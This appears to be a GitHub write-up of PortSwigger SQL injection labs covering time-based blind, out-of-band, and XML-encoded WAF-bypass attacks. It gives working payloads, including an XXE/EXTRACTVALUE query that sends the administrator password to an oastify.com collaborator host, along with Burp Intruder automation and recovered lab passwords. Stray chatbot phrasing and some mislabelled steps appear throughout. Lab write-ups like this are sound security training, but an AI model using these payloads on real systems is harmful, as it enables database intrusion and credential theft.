Below is a well-formatted Markdown (`.md`) file that documents the steps for testing a SQL injection vulnerability using time-based blind SQL injection techniques, as described in your input. The content is organized with clear headings, code blocks, and explanations for each step, making it easy to follow and understand.


# Time-Based Blind SQL Injection Testing

This document outlines the process of testing a web application for time-based blind SQL injection vulnerabilities using PostgreSQL's `pg_sleep` function. The steps involve checking for vulnerabilities, confirming the existence of a `users` table, verifying specific columns and data, and enumerating the password for the `administrator` user.

## Prerequisites
- A tool like Burp Suite with Intruder for automating SQL injection payloads.
- Access to a PostgreSQL database vulnerable to SQL injection.
- Basic understanding of SQL injection techniques and time-based delays.

## Step 1: Test for Time-Based SQL Injection Vulnerability

### Objective
Determine if the application is vulnerable to time-based SQL injection by injecting a delay and observing response times.

### Payloads
```sql
COOKIE'||pg_sleep(10)--
jIPoq0qYcS0Y2AmF'||pg_sleep(10)--
```
- **Description**: These payloads append a `pg_sleep(10)` to introduce a 10-second delay if the injection is successful.
- **Result**: If the response takes approximately 10 seconds, the application is vulnerable to time-based SQL injection.

### Verification with Comparison

#### Confirm that blind sql injection works -

Modify the cookie value

Since it is a POSTgreSQL , we use the following syntax

![image](https://github.com/user-attachments/assets/cc54172f-5d25-433c-9abc-3bc720fda974)


To confirm the vulnerability, compare the response times for true (`1=1`) and false (`1=2`) conditions:
```sql
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END
```
- **Encoded Payloads**:
  ```sql
  jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
  jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
  ```
- **Result**:
  - `1=1`: ~10,300 ms (indicating a delay, confirming vulnerability).

   ![image](https://github.com/user-attachments/assets/ef61b3f7-a5e7-4a11-8743-d3b214f66923)

  - `1=2`: No delay (near-instant response).
- **Conclusion**: The application is vulnerable to time-based SQL injection.

## Step 2: Check for Existence of `users` Table

### Objective
Confirm if a `users` table exists in the database.

### Payload
```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
```

![image](https://github.com/user-attachments/assets/3561fa1d-96a4-4fc9-800d-51ebbbded07d)

- **Description**: Attempts to select from the `users` table. If it exists, a 10-second delay is triggered.
- **Result**: ~20,307 ms (indicating the `users` table exists).

   

- **Conclusion**: The `users` table exists in the database.

## Step 3: Verify `username` Column and `administrator` User

### Objective
Check if the `username` column exists in the `users` table and if there is an `administrator` user.

### Payload
```sql
' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
```
![image](https://github.com/user-attachments/assets/e7df4a35-0ab8-44df-bd5e-4819e60118d9)


- **Description**: Queries the `users` table for a row where `username='administrator'`. A 10-second delay indicates the user exists.
- **Result**: ~10,292 ms (indicating the `username` column and `administrator` user exist).
- **Conclusion**: The `username` column exists, and there is an `administrator` user.

## Step 4: Check for `password` Column

### Objective
Verify if the `password` column exists in the `users` table.

### Payload
```sql
' || (SELECT CASE WHEN (COUNT(*)>0) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
```

 ![image](https://github.com/user-attachments/assets/e55f747e-760d-4c76-9eed-d46025d280cc)

- **Description**: Checks if there are any rows in the `users` table, implying the existence of columns (including `password`). A 10-second delay confirms the presence of data.
- **Result**: ~10,295 ms (indicating the `password` column exists).
- **Conclusion**: The `password` column exists in the `users` table.

## Step 5: Enumerate Password Length for `administrator`

### Objective
Determine the length of the `administrator` user's password.

### Payload
```sql
' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=FUZZ) THEN pg_sleep(20) ELSE pg_sleep(-1) END FROM users) --
```

- **Description**: Uses a fuzzing approach to test different password lengths (`FUZZ`). A 10-second delay indicates the correct length.
- **Initial Test**: Testing with `LENGTH(password)=1` resulted in a 30-second delay, suggesting the password length is not 1. Modified the `ELSE` clause to `pg_sleep(-1)` for faster enumeration.

![image](https://github.com/user-attachments/assets/ea7620d7-12eb-425a-b464-05fa538ffa93)

- **Automation**:
  - Sent to Burp Suite Intruder.

    ![image](https://github.com/user-attachments/assets/6601d4ae-f99e-4c9b-abc9-64eb7a12f453)

  - Configured payload to test integer values for `FUZZ` (e.g., 1 to 30).
  
    ![image](https://github.com/user-attachments/assets/411eff8d-3368-433e-9e2f-b0886e835f02)

  - Launched attack and observed a 10-second delay for `LENGTH(password)=20`.

    ![image](https://github.com/user-attachments/assets/28d0e740-72d0-4cd6-8507-5ff17c049e90)

- **Result**: Password length is 20 characters.
- **Conclusion**: The `administrator` password is 20 characters long.

## Step 6: Enumerate the Password

### Objective
Extract the `administrator` password character by character.

### Payload
```sql
SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```


- **Description**: Tests each character of the password by checking if the substring matches a specific character (e.g., `'a'`). A 10-second delay indicates a match.
- **Automation**:
  - Sent to Burp Suite Intruder.
  
    ![image](https://github.com/user-attachments/assets/c342c85d-c06a-4318-8806-f951da7583ec)

  - Configured payload to test characters (e.g., `a-z`, `0-9`) for each position (1 to 36).

     ![image](https://github.com/user-attachments/assets/a15dab4e-bcb9-49b0-ba4b-2ec653c6374d)

  - Continued character by character until the password was fully enumerated.
 
      ![image](https://github.com/user-attachments/assets/237e9afd-be4d-47b0-a43d-dc5276acd7c2)

- **Observation**: One character, `'3'`, caused a noticeably longer response time, but the process continued successfully.So we have find over admin passowrd last character

   ![image](https://github.com/user-attachments/assets/f34bdcb8-873a-4324-91cc-ca16752ac884)


- **Result**: Password enumerated as `adpy3kbcu2pm1ihhyji3`.

    Login as Administrator and lab will be solved

  ![image](https://github.com/user-attachments/assets/5aa063e2-f1ef-452c-8665-5acc1528ae95)


## Final Result
- **Vulnerability**: Confirmed time-based blind SQL injection.
- **Table**: `users` table exists.
- **Columns**: `username` and `password` columns exist.
- **User**: `administrator` user exists.
- **Password Length**: 20 characters.
- **Password**: `adpy3kbcu2pm1ihhyji3`.
- **Status**: Lab solved.

---

### LAB 16 - Blind SQL injection with out-of-band interaction

### Lab Description

![image](https://github.com/user-attachments/assets/1fc90fa9-efdd-4b3b-983b-c81474c9f3cc)

### Solution

We don't know which database we are dealing with , so we try all the payloads for each databases given in cheatsheat.

![image](https://github.com/user-attachments/assets/dd91c0c1-e67f-412a-9fcb-074756ab6bb0)


First we start with ORACLE db,

Open burp collaborator client, copy one of the domain provided to clipbopard,

![image](https://user-images.githubusercontent.com/67383098/235473410-2fbcfcda-6aa3-4d9e-93ac-7159d6764ef8.png)

Use the payload 

```sql
' union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

So the query would made to db would look like this ,

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

This triggers a DNS request to our collaborater server, and once we get a `200 OK` response, if we click `Poll Now` button in Burp Collaborator, we get **4 DNS requests**

![image](https://github.com/user-attachments/assets/0109a88b-7d43-4a68-9bd6-38e6059d3e45)

![image](https://github.com/user-attachments/assets/98a265a8-9831-4762-9fc3-7a1b29b7432c)
---

### LAB 17 - Blind SQL injection with out-of-band data exfiltration

### Lab Description

![image](https://github.com/user-attachments/assets/afead458-31b5-439d-a2a9-f2a7abcec26a)

### Overview

The process of exploiting an out-of-band (OAST) SQL injection vulnerability in a web application using PostgreSQL's EXTRACTVALUE and XML external entity (XXE) techniques to interact with a collaborator server (e.g., Burp Collaborator or OASTify). The goal is to confirm the vulnerability and extract the administrator user's password from the users table.

### Solution

Cheatsheet to exfiltrate data using OAST technique,

![image](https://github.com/user-attachments/assets/8e58d145-8e79-431d-8a61-69e5dfda5d0f)


#### Step 1: Test for Out-of-Band SQL Injection Vulnerability

**Objective**
Determine if the application is vulnerable to out-of-band SQL injection by triggering an HTTP request to a collaborator server.

**Payload**

```
Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;

````


**Description**: This payload uses **EXTRACTVALUE** with an XXE entity to make an HTTP request to a collaborator server **(rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com)**. If the server receives a request, the application is vulnerable.

**Result**: Interaction observed on the collaborator server, confirming the vulnerability.


#### Step 2: Enumerate Password Character by Character

**Description**: Tests if the first character of the administrator password is **'a'**. If true, it triggers an HTTP request to the collaborator server. If false, no request is made.

**Test:**
Tested with the first character not equal to 'a' and observed an interaction, confirming the payload works.
Modified to test equality (=) for positive confirmation of characters.

**Payload**

```
SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) ELSE NULL END FROM dual
```

**Encoded Payload:**

```
FFyToxqSs49lpxuC'+union+SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))!='a')+THEN+'a'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)+ELSE+NULL+END+FROM+dual--;

```
![image](https://github.com/user-attachments/assets/c89639d2-5d83-4518-b552-a80e039a500a)

![image](https://github.com/user-attachments/assets/8239c8e0-09d1-4d43-880e-2df162ed44b9)





**Automation:**
Sent to Burp Suite Intruder.
Configured two payload positions:
Character: Test a-z, 0-9 for each position of the password.
Subdomain: Unique collaborator subdomain for each request.


Set attack type to Battering Ram to synchronize payloads.

![image](https://github.com/user-attachments/assets/d2bbc4e9-782c-4f5f-949a-225014eb2c64)


**Result:** Found an interaction for the letter 'e' as the first character.

![image](https://github.com/user-attachments/assets/ac057fae-9005-49dd-b72c-90f5ca2cd9d4)

**Process**: Repeated for each position (1 to 20, based on prior knowledge of password length) to enumerate the password **e6jomps7kptnx04vcvtz**.
Conclusion: The password is e6jomps7kptnx04vcvtz.

#### Step 3: Direct Password Extraction (Alternative)

Description: Concatenates the administrator password into the collaborator URL, causing the server to receive an HTTP request with the password in the subdomain **(e.g., e6jomps7kptnx04vcvtz.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com).**

Extract the full administrator password in a single query by embedding it in the collaborator URL.

**Payload (Cheat-Sheet)**
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

```

**Encoded Payload:**
```
mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
**Result:** The collaborator server received a request with the subdomain containing `e6jomps7kptnx04vcvtz`, confirming the password.

![image](https://github.com/user-attachments/assets/a9bfb4a6-3297-48d5-a094-f5984ee99b92)



**Conclusion**: The password e6jomps7kptnx04vcvtz was extracted directly.

Below is a well-formatted Markdown (`.md`) file summarizing the final results of the out-of-band SQL injection testing, as provided in your input. The content is concise, focusing solely on the final results, and is formatted for clarity and readability.


### Final Results

- **Vulnerability**: Confirmed out-of-band SQL injection.
- **Table**: `users` table exists.
- **User**: `administrator` user exists.
- **Password**: `e6jomps7kptnx04vcvtz` (confirmed via both character-by-character enumeration and direct extraction).


Now we can log in as administrator using the passwrod which we got,

![image](https://user-images.githubusercontent.com/67383098/235477465-fee54da3-d819-42cc-94e1-99f77adb399f.png)



---

### LAB 18 - SQL injection with filter bypass via XML encoding

### Lab Description

![image](https://github.com/user-attachments/assets/f21b6ba5-99cb-4940-bebb-f40257292cd3)

### Solution

I understand you're writing this for GitHub and want to avoid full documentation-style content like a formal `.md` file with extensive sections. Instead, I'll provide a concise Markdown file with just the essential information from the SQL injection lab, focusing on the key steps and payloads without extra documentation fluff. This will be suitable for a GitHub README or similar.


### SQL Injection with Filter Bypass via XML Encoding

This covers exploiting an SQL injection vulnerability in the stock availability check function, bypassing a WAF using XML encoding with the Hackvertor extension.

#### Steps

Let’s start by exploring the query function to check for availability.

![image](https://github.com/user-attachments/assets/afa97618-6227-4e1f-af97-363a3604f337)


1. **Test SQL Injection**  
   Tried standard payload in Burp Repeater:
   ```sql
   1 UNION SELECT NULL --
   ```
![image](https://github.com/user-attachments/assets/5bcf8ecd-9fe8-4c04-9e89-08f670886444)

   Got `403 Attack detected`. WAF is blocking.

1. **Bypass WAF with Hackvertor**  
   Encoded payload using `hex_entities` in Hackvertor:
   ```sql
   1 UNION SELECT NULL --
   ```

![image](https://github.com/user-attachments/assets/c9f4f050-f63c-41a0-81fb-f2eafec1cb84)

   Sent via Repeater, bypassed WAF successfully.

 ![image](https://github.com/user-attachments/assets/a928b6aa-be8e-4773-95cc-6e09ce7f0ac6)

2. **Find Column Count**  
   Used encoded payload:
   ```sql
   1 UNION SELECT NULL --
   ```
![image](https://github.com/user-attachments/assets/f02212f9-5219-451f-b7b1-ed35a43857e1)

   Confirmed table has **1 column**.

2. **Extract Credentials**  
   Used PortSwigger cheat sheet payload:
   ```sql
   1 UNION SELECT username||'~'||password FROM users --
   ```
![image](https://github.com/user-attachments/assets/46bddc12-a45c-4352-bfed-3fcaca7ce5bf)

   Encoded with Hackvertor, got `administrator~e6jomps7kptnx04vcvtz`.

2. **Login**  
   Logged in with:
   - Username: `administrator`
   - Password: `e6jomps7kptnx04vcvtz`  
   Lab solved.

![image](https://github.com/user-attachments/assets/4f4cb4ce-8462-48d0-8814-17823b29a3e1)


---

